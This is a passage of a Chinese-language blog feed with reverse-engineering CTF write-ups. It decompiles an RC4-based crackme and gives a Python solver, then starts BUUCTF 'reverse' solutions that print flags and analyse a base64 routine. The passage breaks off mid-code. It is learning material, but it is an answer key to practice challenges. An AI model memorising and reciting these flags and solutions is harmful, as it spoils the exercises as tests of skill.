class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int16 v3; // ax</span><br><span class="line">  unsigned __int16 v4; // ax</span><br><span class="line">  char buf; // [rsp+20h] [rbp-140h]</span><br><span class="line">  char s1[8]; // [rsp+30h] [rbp-130h]</span><br><span class="line">  char v8; // [rsp+38h] [rbp-128h]</span><br><span class="line">  char s[8]; // [rsp+40h] [rbp-120h]</span><br><span class="line">  char v10; // [rsp+50h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v11; // [rsp+158h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  v8 = 0;</span><br><span class="line">  s1[0] = 0x7E;</span><br><span class="line">  s1[1] = 0x1E;</span><br><span class="line">  s1[2] = 0xD4u;</span><br><span class="line">  s1[3] = 0x81u;</span><br><span class="line">  s1[4] = 0x42;</span><br><span class="line">  s1[5] = 0xB2u;</span><br><span class="line">  s1[6] = 0xA0u;</span><br><span class="line">  s1[7] = 0x8Fu;</span><br><span class="line">  memset(&amp;v10, 0, 0x100uLL);</span><br><span class="line">  strcpy(s, &quot;ilovectf&quot;);                        // s=ilovectf</span><br><span class="line">  sub_40095F();                     //输入信息，不用分析:puts(&quot;Please reverse me!&quot;);</span><br><span class="line">  puts(&quot;input flag:&quot;);</span><br><span class="line">  read(0, &amp;buf, 8uLL);</span><br><span class="line">  v3 = strlen(s);                               // 8</span><br><span class="line">  sub_400666(&amp;v10, s, v3);</span><br><span class="line">  v4 = strlen(&amp;buf);</span><br><span class="line">  sub_400823(&amp;v10, &amp;buf, v4);</span><br><span class="line">  if ( !strcmp(s1, &amp;buf) )</span><br><span class="line">    puts(&quot;success!,Please submit with flag&#123;your input&#125;&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;fail!&quot;);</span><br><span class="line">  return 0LL;                                   // buf=[0x7E,0x1E,0xD4,0x81,0x42,0xB2,0xA0,0x8F]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们看下sub_400666(&amp;v10, s, v3);这个函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400666(__int64 a1, __int64 a2, unsigned __int16 a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; // eax          a1=v10[256]         a2 = s&quot;ilovectf&quot;     a3=8    </span><br><span class="line">  char v4; // ST27_1</span><br><span class="line">  signed int i; // [rsp+28h] [rbp-118h]</span><br><span class="line">  signed int j; // [rsp+28h] [rbp-118h]</span><br><span class="line">  int v8; // [rsp+2Ch] [rbp-114h]</span><br><span class="line">  char v9[264]; // [rsp+30h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v10; // [rsp+138h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  v8 = 0;</span><br><span class="line">  memset(v9, 0, 0x100uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 255; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(i + a1) = i;                              // a1[256]=0-255</span><br><span class="line">    v9[i] = *(i % a3 + a2);                     // v9=  a[i%8]  (ilovectf)</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j = 0; j &lt;= 255; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = ((v9[j] + v8 + *(j + a1)) &gt;&gt; 31) &gt;&gt; 24;// v3=v9[j]+v8+(al[j]&gt;&gt;31)&gt;&gt;24</span><br><span class="line">    v8 = (v3 + v9[j] + v8 + *(j + a1)) - v3;    //    v8=v9+v8+al[j]</span><br><span class="line">    v4 = *(j + a1);                             // v4=al[j]</span><br><span class="line">    *(a1 + j) = *(v8 + a1);                     // a[j]=al[v8]</span><br><span class="line">    *(a1 + v8) = v4;                            // al[v8]=v4</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里面注意下，函数里面有太多移位操作了，但大多数都相当于没有这些操作，一个字是2个字节，16位，双字就是32位，&gt;&gt;31后就等于0了，又&gt;&gt;24还是零，我们将其化简，见上面注释</p></blockquote><blockquote><p>我们接着看下sub_400823(&amp;v10, &amp;buf, v4);这个函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_400823(__int64 a1, __int64 a2, unsigned __int16 a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int v3; // ST20_4 a1=v10[256]   a2 =buf[8]          a3=8</span><br><span class="line">  unsigned int v4; // eax</span><br><span class="line">  char v5; // ST19_1</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned __int16 i; // [rsp+16h] [rbp-Eh]</span><br><span class="line">  int v8; // [rsp+18h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  v8 = 0;</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    if ( i &gt;= a3 )                              // 循环 8次</span><br><span class="line">      break;                                    // v3=v8+1</span><br><span class="line">    v3 = ((((v8 + 1) &gt;&gt; 31) &gt;&gt; 24) + v8 + 1) - (((v8 + 1) &gt;&gt; 31) &gt;&gt; 24);</span><br><span class="line">    v4 = ((v8 + *(v3 + a1)) &gt;&gt; 31) &gt;&gt; 24;   // v4=0，相当于没有 v4没有存在过</span><br><span class="line">    v8 = (v4 + v8 + *(v3 + a1)) - v4;           // v8=v8+v10[v3]</span><br><span class="line">    v5 = *(v3 + a1);                            // v5=v10[v3]</span><br><span class="line">    *(a1 + v3) = *(v8 + a1);                    // v10[v3]=v10[v8]</span><br><span class="line">    *(a1 + v8) = v5;                            // v10[v8] = v5</span><br><span class="line">    *(i + a2) ^= *((*(v3 + a1) + *(v8 + a1)) + a1);// a2[i]=a2[i]^ (v10[v10[v3]+v10[v8]])</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="脚本编写："><a href="#脚本编写：" class="headerlink" title="脚本编写："></a>脚本编写：</h2><blockquote><p>这道题其实是RC4算法，看到一篇很好的链接讲的很详细：<a href="https://www.52pojie.cn/thread-800115-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-800115-1-1.html</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">key=&quot;ilovectf&quot;#密钥key</span><br><span class="line">S=[]#S盒 S[256]</span><br><span class="line">T=[]#暂时向量T</span><br><span class="line">J=0</span><br><span class="line">tmp=&quot;&quot;</span><br><span class="line">for i in range(256):</span><br><span class="line">S.append(i)#将0-255的互不重复的元素装入S盒，S[256]</span><br><span class="line">T.append(chr(ord(key[i%8])))#暂时向量T: 将密钥的长度为单位将密钥循环放入其中   这里是v9[256]</span><br><span class="line">#print(v9)</span><br><span class="line">for i in range(256):</span><br><span class="line">v3=0</span><br><span class="line">J=(S[i]+ord(T[i])+J)&amp;0xff#保证是一个字节（0-256范围内）</span><br><span class="line">tmp=S[i] </span><br><span class="line">S[i]=S[J]</span><br><span class="line">S[J]=tmp#交换s[i]和s[j]</span><br><span class="line">#print(S)#根据密钥key打乱S盒，i保证每个元素都得到处理，j保证S盒的打乱是随机的</span><br><span class="line"></span><br><span class="line">#参数一：被打乱的S-box；参数二：是需要加密的数据data；参数3是data的长度</span><br><span class="line">j=0</span><br><span class="line">flag=[]</span><br><span class="line">miwen=[0x7E,0x1E,0xD4,0x81,0x42,0xB2,0xA0,0x8F]#要加密的数据   加密后得到 V3rygo0d 明文</span><br><span class="line">for k in range(len(miwen)):</span><br><span class="line">i=(j+1)&amp;0xff #这题或许  这一点和标准的RC4不同吧，标准的是  （i=i+1）&amp;0xff</span><br><span class="line">j=(j+S[i])&amp;0xff</span><br><span class="line">tmp=S[i]</span><br><span class="line">S[i]=S[j]</span><br><span class="line">S[j]=tmp</span><br><span class="line">#print(S[(S[v3]+S[v80])&amp;0xff])</span><br><span class="line">flag.append(S[(S[i]+S[j])&amp;0xff])</span><br><span class="line">print(flag)</span><br><span class="line">flagg=&quot;&quot;</span><br><span class="line">for i in range(8):</span><br><span class="line">flagg+=chr(flag[i]^miwen[i])</span><br><span class="line">print(flagg)</span><br></pre></td></tr></table></figure><h2 id="脑子啊"><a href="#脑子啊" class="headerlink" title="脑子啊"></a>脑子啊</h2><blockquote><p>这道题起初我看到256就想到RC4了，但不熟悉它，因为平时没太多怎么对elf程序动态调试过，所以刚好拿它熟悉下，ida动态调试，get到了。下面是我调试做的记录，分析过程的记录都在备注上，（动态调试不应该像我这样用，而是应该静态某步或某个函数没太懂，猜测下然后去验证使用，不然花时间会很长，主要花在变量与寄存器的对应关系上），不管，就是要使用动态调试，因为时间结束时间还很很长嘛！</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">easy_re:0000000000400745 ; ---------------------------------------------------------------------------</span><br><span class="line">easy_re:0000000000400745</span><br><span class="line">easy_re:0000000000400745 loc_400745:                             ; CODE XREF: easy_re:0000000000400806↓j</span><br><span class="line">easy_re:0000000000400745 mov     eax, [rbp-118h]                 ; eax=i</span><br><span class="line">easy_re:000000000040074B movsxd  rdx, eax                        ; rdx=i</span><br><span class="line">easy_re:000000000040074E mov     rax, [rbp-128h]                 ; 指向al[0]的指针</span><br><span class="line">easy_re:0000000000400755 add     rax, rdx                        ; 指向al[i]的指针</span><br><span class="line">easy_re:0000000000400758 movzx   eax, byte ptr [rax]             ; al[i]=rbp-128[1]=0xC  ;  al[3]=0x87</span><br><span class="line">easy_re:000000000040075B movzx   edx, al                         ; edx=0xC；  将al[3] 0x87暂时放在 edx中</span><br><span class="line">easy_re:000000000040075E mov     eax, [rbp-114h]                 ; eax=0  C 0x95  v8(我觉的)</span><br><span class="line">easy_re:0000000000400764 add     edx, eax                        ; edx=0xC+0=0xC   0xC+0x89=0x95 我觉得v8+al[j]=0x11c</span><br><span class="line">easy_re:0000000000400766 mov     eax, [rbp-118h]                 ; eax=i</span><br><span class="line">easy_re:000000000040076C cdqe</span><br><span class="line">easy_re:000000000040076E movzx   eax, byte ptr [rbp+rax-110h]    ; 猜是v9[i]指针</span><br><span class="line">easy_re:0000000000400776 movsx   eax, al</span><br><span class="line">easy_re:0000000000400779 add     edx, eax                        ; edx=v8+al[j]  + v9[j]</span><br><span class="line">easy_re:000000000040077B mov     eax, edx</span><br><span class="line">easy_re:000000000040077D sar     eax, 1Fh                        ; (v8+al[j]  + v9[j])&gt;&gt;31</span><br><span class="line">easy_re:0000000000400780 shr     eax, 18h                        ; 算出  v3  存在 eax</span><br><span class="line">easy_re:0000000000400783 add     edx, eax                        ; edx存的v8+al[j]+v9[j] 0x11C</span><br><span class="line">easy_re:0000000000400785 movzx   edx, dl                         ; edx=byte（v8+al[j]  + v9[j]=0x11C）=0x1c</span><br><span class="line">easy_re:0000000000400788 sub     edx, eax                        ; -v3  算出  v8存在  edx中</span><br><span class="line">easy_re:000000000040078A mov     eax, edx                        ; v8暂时 放在eax中</span><br><span class="line">easy_re:000000000040078C mov     [rbp-114h], eax                 ; 将  v8   0x1C入栈  存在[rbp-114h]</span><br><span class="line">easy_re:0000000000400792 mov     eax, [rbp-118h]                 ; eax=i</span><br><span class="line">easy_re:0000000000400798 movsxd  rdx, eax                        ; edx=i</span><br><span class="line">easy_re:000000000040079B mov     rax, [rbp-128h]                 ; al[0]</span><br><span class="line">easy_re:00000000004007A2 add     rax, rdx</span><br><span class="line">easy_re:00000000004007A5 movzx   eax, byte ptr [rax]</span><br><span class="line">easy_re:00000000004007A8 mov     [rbp-119h], al                  ; v4= al[2]=0x89;al[3]=0x87 暂时放在 [rbp-119]处</span><br><span class="line">easy_re:00000000004007AE mov     eax, [rbp-118h]</span><br><span class="line">easy_re:00000000004007B4 movsxd  rdx, eax                        ; rdx=i=2</span><br><span class="line">easy_re:00000000004007B7 mov     rax, [rbp-128h]                 ; al[0]</span><br><span class="line">easy_re:00000000004007BE add     rdx, rax                        ; rdx=指向al[i=3]</span><br><span class="line">easy_re:00000000004007C1 mov     eax, [rbp-114h]                 ; v8  95;eax=v8=0x1C</span><br><span class="line">easy_re:00000000004007C7 movsxd  rcx, eax                        ; rcx=0x95;0x1C</span><br><span class="line">easy_re:00000000004007CA mov     rax, [rbp-128h]                 ; rax为  al[]指针</span><br><span class="line">easy_re:00000000004007D1 add     rax, rcx                        ; al[48]得指针处;  指向 al[v8=1C]地址</span><br><span class="line">easy_re:00000000004007D4 movzx   eax, byte ptr [rax]             ; eax=0x65；取出al[v8]地址数据  0x77</span><br><span class="line">easy_re:00000000004007D7 mov     [rdx], al                       ; al[3]=0x77</span><br><span class="line">easy_re:00000000004007D9 mov     eax, [rbp-114h]                 ; 取出   v8=0x1C</span><br><span class="line">easy_re:00000000004007DF movsxd  rdx, eax                        ; rdx=v8=0x1C</span><br><span class="line">easy_re:00000000004007E2 mov     rax, [rbp-128h]</span><br><span class="line">easy_re:00000000004007E9 add     rdx, rax</span><br><span class="line">easy_re:00000000004007EC movzx   eax, byte ptr [rbp-119h]        ; al[v8]=v4=0x87</span><br><span class="line">easy_re:00000000004007F3 mov     [rdx], al</span><br><span class="line">easy_re:00000000004007F5 add     dword ptr [rbp-118h], 1         ; i</span><br><span class="line">easy_re:00000000004007FC</span><br><span class="line">easy_re:00000000004007FC loc_4007FC:                             ; CODE XREF: easy_re:0000000000400740↑j</span><br><span class="line">easy_re:00000000004007FC cmp     dword ptr [rbp-118h], 0FFh</span><br><span class="line">easy_re:0000000000400806 jle     loc_400745                      ; eax=i</span><br></pre></td></tr></table></figure><blockquote><p>这个动态调试只是记录下！总之呢，熟悉了RC4算法。</p></blockquote><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote><p>我的方法不是正解，周三晚上组长讲了正规解法，因为精神不佳，我怎么记不清了，哭！！！ 得不偿失的事情，我或许做的太多啦！<br><a href="https://imgchr.com/i/uuZ39J" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/27/uuZ39J.png" alt="uuZ39J.png"></a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验室每月举行比赛了，害怕又期待！认真学就好了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF re部分题解1</title>
    <link href="http://yoursite.com/2019/09/27/BUUCTF%20re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A31/"/>
    <id>http://yoursite.com/2019/09/27/BUUCTF re部分题解1/</id>
    <published>2019-09-27T15:34:19.000Z</published>
    <updated>2019-09-27T16:29:16.188Z</updated>
    
    <content type="html"><![CDATA[<p>没有妄想，没有失望！</p><a id="more"></a><h1 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h1><blockquote><p>首先载入ida找到  main()函数：<br>直接看到 flag了，额！DBAPP{49d3c93df25caad81232130f3d2ebfad}<br>提交时：flag{49d3c93df25caad81232130f3d2ebfad}</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int main_0()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  char v1; // [esp+4Ch] [ebp-Ch]</span><br><span class="line">  const char *v2; // [esp+50h] [ebp-8h]</span><br><span class="line">  int v3; // [esp+54h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 5;</span><br><span class="line">  v2 = &quot;DBAPP&#123;49d3c93df25caad81232130f3d2ebfad&#125;&quot;;</span><br><span class="line">  while ( v3 &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;距离出现答案还有%d秒，请耐心等待！\n&quot;, v3);</span><br><span class="line">    sub_40100A();</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(</span><br><span class="line">    &quot;\n&quot;</span><br><span class="line">    &quot;\n&quot;</span><br><span class="line">    &quot;\n&quot;</span><br><span class="line">    &quot;这里本来应该是答案的,但是粗心的程序员忘记把变量写进来了,你要不逆向试试看:(Y/N)\n&quot;);</span><br><span class="line">  v1 = &apos;\x01&apos;;</span><br><span class="line">  scanf(&quot;%c&quot;, &amp;v1);</span><br><span class="line">  if ( v1 == &apos;Y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;OD吾爱破解或者IDA这些逆向软件都挺好的！&quot;);</span><br><span class="line">    result = sub_40100A();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v1 == &apos;N&apos; )</span><br><span class="line">      printf(&amp;byte_425034);</span><br><span class="line">    else</span><br><span class="line">      printf(&amp;byte_42501C);</span><br><span class="line">    result = sub_40100A();</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h1><blockquote><p>载入ida：<br>main()</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  return main_0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进入main_0函数：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 main_0()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  const char *v1; // eax</span><br><span class="line">  size_t v2; // eax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  __int64 v4; // ST08_8</span><br><span class="line">  signed int j; // [esp+DCh] [ebp-ACh]</span><br><span class="line">  signed int i; // [esp+E8h] [ebp-A0h]</span><br><span class="line">  signed int v8; // [esp+E8h] [ebp-A0h]</span><br><span class="line">  char Dest[108]; // [esp+F4h] [ebp-94h]</span><br><span class="line">  char Str; // [esp+160h] [ebp-28h]</span><br><span class="line">  char v11; // [esp+17Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; 100; ++i )                   // Dest[100]的数组  全等于 0</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)i &gt;= 0x64 )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    Dest[i] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_41132F(&quot;please enter the flag:&quot;);</span><br><span class="line">  sub_411375(&quot;%20s&quot;, &amp;Str);                     // 输入字符串</span><br><span class="line">  v0 = j_strlen(&amp;Str);                          // v0=字符串  长度</span><br><span class="line">  v1 = (const char *)sub_4110BE((int)&amp;Str, v0, (int)&amp;v11);// v1=base64</span><br><span class="line">  strncpy(Dest, v1, 40u);</span><br><span class="line">  v8 = j_strlen(Dest);</span><br><span class="line">  for ( j = 0; j &lt; v8; ++j )</span><br><span class="line">    Dest[j] += j;                               // Dest[j] =Dest[j]+j</span><br><span class="line">  v2 = j_strlen(Dest);                          // v2= 16</span><br><span class="line">  if ( !strncmp(Dest, Str2, v2) )               // e3nifIH9b_C@n@dH</span><br><span class="line">    sub_41132F(&quot;rigth flag!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_41132F(&quot;wrong flag!\n&quot;);</span><br><span class="line">  HIDWORD(v4) = v3;</span><br><span class="line">  LODWORD(v4) = 0;</span><br><span class="line">  return v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们进入sub_4110BE(),猜测是base64</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">void *__cdecl sub_411AB0(char *a1, unsigned int a2, int *a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // STE0_4</span><br><span class="line">  int v5; // STE0_4</span><br><span class="line">  int v6; // STE0_4</span><br><span class="line">  int v7; // [esp+D4h] [ebp-38h]</span><br><span class="line">  signed int i; // [esp+E0h] [ebp-2Ch]</span><br><span class="line">  unsigned int v9; // [esp+ECh] [ebp-20h]</span><br><span class="line">  int v10; // [esp+ECh] [ebp-20h]</span><br><span class="line">  signed int v11; // [esp+ECh] [ebp-20h]</span><br><span class="line">  void *Dst; // [esp+F8h] [ebp-14h]</span><br><span class="line">  char *v13; // [esp+104h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  if ( !a1 || !a2 )</span><br><span class="line">    return 0;</span><br><span class="line">  v9 = a2 / 3;</span><br><span class="line">  if ( (signed int)(a2 / 3) % 3 )</span><br><span class="line">    ++v9;</span><br><span class="line">  v10 = 4 * v9;</span><br><span class="line">  *a3 = v10;</span><br><span class="line">  Dst = malloc(v10 + 1);</span><br><span class="line">  if ( !Dst )</span><br><span class="line">    return 0;</span><br><span class="line">  j_memset(Dst, 0, v10 + 1);</span><br><span class="line">  v13 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  while ( v11 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_41A144[2] = 0;</span><br><span class="line">    byte_41A144[1] = 0;</span><br><span class="line">    byte_41A144[0] = 0;</span><br><span class="line">    for ( i = 0; i &lt; 3 &amp;&amp; v11 &gt;= 1; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      byte_41A144[i] = *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !i )</span><br><span class="line">      break;</span><br><span class="line">    switch ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v4 = v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v4++) = aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) | 16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v4++) = aAbcdefghijklmn[64];</span><br><span class="line">        *((_BYTE *)Dst + v4) = aAbcdefghijklmn[64];</span><br><span class="line">        v7 = v4 + 1;</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v5 = v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v5++) = aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) | 16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v5++) = aAbcdefghijklmn[((byte_41A144[2] &amp; 0xC0) &gt;&gt; 6) | 4 * (byte_41A144[1] &amp; 0xF)];</span><br><span class="line">        *((_BYTE *)Dst + v5) = aAbcdefghijklmn[64];</span><br><span class="line">        v7 = v5 + 1;</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(signed int)(unsigned 